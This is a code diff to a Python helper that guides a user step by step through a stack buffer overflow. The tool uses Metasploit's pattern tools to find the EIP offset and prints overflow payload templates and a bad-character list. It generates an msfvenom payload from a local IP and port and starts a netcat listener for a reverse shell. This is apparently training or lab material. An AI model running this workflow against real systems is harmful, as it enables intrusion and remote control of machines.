@@ -64,9 +64,9 @@ def cmd_options():
     parser = argparse.ArgumentParser(description="Simple application for step by step buffer overflow",
                                      usage=''' python3 buffer_overflow -s <step number> [options]
 
-        Example: 
-
-            python3 buffer_overflow -s 2 --a''',
+        Example:    python3 buffer_overflow -s 2 -a
+            
+            ''',
                                      formatter_class=argparse.RawTextHelpFormatter)
 
     parser.add_argument('-s',
@@ -178,11 +178,17 @@ def is_valid_arguments(step):
 def get_unique_bytes():
     while True:  # While input is not correct continue
         unique_bytes = input(Fore.BLUE + Style.BRIGHT + "[+] Paste unique bytes found in EIP:" + Style.RESET_ALL)
-        if len(str(unique_bytes)) / 2 == 4:  # If
+        if len(str(unique_bytes)) / 2 == 4:
             return str(unique_bytes)
         else:
             print(Fore.RED + Style.BRIGHT + "[!] Input must be an integer" + Style.RESET_ALL)
             continue
+
+
+'''
+    Method: finding_offset
+    Purpose: Return byte offset found in EIP register
+'''
 
 
 def finding_offset():
@@ -190,7 +196,7 @@ def finding_offset():
 
     byte_count = get_byte_count()
 
-    generate_unique_bytes(f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {byte_count}")
+    generate_unique_bytes(f"/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {byte_count} > tmp.txt")
 
     unique_bytes = get_unique_bytes()
 
@@ -224,9 +230,14 @@ def get_byte_count():
 
 
 def generate_unique_bytes(pattern_create_unique_bytes):
-    print("unique_bytes=('")
     subprocess.run(pattern_create_unique_bytes, shell=True)
-    print("')", end='')
+    with open('tmp.txt', 'rb+') as file:  # Open file with as read/binary file
+        file.seek(0)  # Find beginning of file
+        file.write("payload=('".encode())  # Write unique_bytes=(' to beginning of file
+        file.seek(-1, 2)  # Find last line of file
+        file.write("')".encode())  # Write ') to last line of file
+    subprocess.run("cat tmp.txt", shell=True)  # Display results
+    subprocess.run("rm tmp.txt", shell=True)  # Remove temporary file
     print("\n\n")
 
 
@@ -240,7 +251,7 @@ def find_offset(pattern_offset):
     offset = ''
     print("\n")
     subprocess.run(pattern_offset, shell=True)  # Run pattern_offset.rb and output to tmp.txt
-    subprocess.run("cat tmp.txt | awk -F ' ' '{ print$6 }' > tmp2.txt", shell=True)  # Extract offset 
+    subprocess.run("cat tmp.txt | awk -F ' ' '{ print$6 }' > tmp2.txt", shell=True)  # Extract offset
     with open('tmp2.txt', 'r') as file:
         for line in file:
             offset = line.rstrip()
@@ -258,7 +269,15 @@ def find_offset(pattern_offset):
 
 def bad_characters(offset):
     counter = 0
-    print("\n[+] Bad Characters 1-255\n")
+    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
+        f'''
+           [4] Find bad characters
+
+               [4.a] Send all possible 255 characters in hex and look for abnormal characters
+
+        '''
+    ) + Style.RESET_ALL)
+    print("[+] Bad Characters 1-255\n")
     print("badchars=(")
     for chars in range(1, 256):  # Write each HEX character 1-256 skipping NULL byte
         if counter == 0:
@@ -272,16 +291,7 @@ def bad_characters(offset):
 
     print('"', end="" + ")" + "\n\n")
 
-    print(Fore.CYAN + Style.BRIGHT + textwrap.dedent(
-        f'''
-           [4] Find bad characters
-               
-               [4.a] Send all possible 255 characters in hex and look for abnormal characters
-                      
-        '''
-    ) + Style.RESET_ALL)
-
-    print(Fore.RED + Style.BRIGHT + f"payload = 'A' * {offset} + 'B' * 4 + badchars" + Style.RESET_ALL + "\n")
+    print(Fore.RED + Style.BRIGHT + f"\tpayload = 'A' * {offset} + 'B' * 4 + badchars" + Style.RESET_ALL + "\n")
 
     validation()
 
@@ -323,13 +333,12 @@ def overwrite_the_eip(offset):
         [3] Overwrite the EIP
             
             [3.a] Once we have the offset send ‘A’s the same size as offset, then four ‘B’s to make sure
-                  we have control of EIP example: 
-                   
-                    > buff = 'A' * {offset} + 'B' * 4
-           
-           [3.b] The EIP should be overwritten with ‘42424242’ (if not redo step 2)
+                  we have control of EIP.  The EIP should be overwritten with ‘42424242’ (if not redo step 2)
+
         '''
     ) + Style.RESET_ALL)
+
+    print(Fore.RED + Style.BRIGHT + f"\tpayload = 'A' * {offset} + 'B' * 4" + Style.RESET_ALL + "\n")
 
     while True:
         response = input(
@@ -344,6 +353,12 @@ def overwrite_the_eip(offset):
         else:
             print(Fore.RED + Style.BRIGHT + "[!] Something is wrong. Check your input" + Style.RESET_ALL)
             continue
+
+
+'''
+    Method: generate_payload
+    Purpose: Generate msfvenmon payload
+'''
 
 
 def generate_payload(local_host_ip, local_host_port, bad_chars):
@@ -365,6 +380,12 @@ def generate_payload(local_host_ip, local_host_port, bad_chars):
 
     kill_port(local_host_port)  # Kill all processes listening on local port of choice
     nc_listener(local_host_port)  # Start netcat listener
+
+
+'''
+    Method: get_payload_dependencies
+    Purpose: Receive all necessary information to generate msfvenom payload
+'''
 
 
 def get_payload_dependencies():
@@ -392,6 +413,12 @@ def get_payload_dependencies():
     bad_chars = input(Fore.BLUE + Style.BRIGHT + "[*] Enter badcharacters found in step 4:" + Style.RESET_ALL)
 
     return local_host_ip, local_host_port, bad_chars
+
+
+'''
+    Method: kill_port
+    Purpose: Kill any service listening on port specified by user
+'''
 
 
 def kill_port(lport):
